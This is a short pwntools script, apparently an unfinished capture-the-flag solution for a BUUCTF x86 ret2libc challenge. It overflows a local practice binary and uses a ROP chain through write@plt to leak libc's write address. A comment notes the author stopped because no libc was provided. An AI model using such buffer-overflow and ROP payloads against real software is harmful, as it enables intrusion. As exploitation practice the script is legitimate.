#Made by fly_autumn
#x86 ret2libc
from pwn import *
p = process("./2018_rop")
elf = ELF("./2018_rop")
context(os="linux",arch="i386")

offset = 140
write_plt = elf.plt["write"]
write_got = elf.got["write"]
func_plt = 0x8048474
payload = b"\x00" * offset + p32(write_plt) + p32(func_plt) + p32(1) + p32(write_got) + p32(4)
p.sendline(payload)

write_addr = u32(p.recv(4))
log.success("write addr: "+hex(write_addr))
#然后就写不下去了，因为你BUUCTF一如既往不给libc喵

p.interactive()
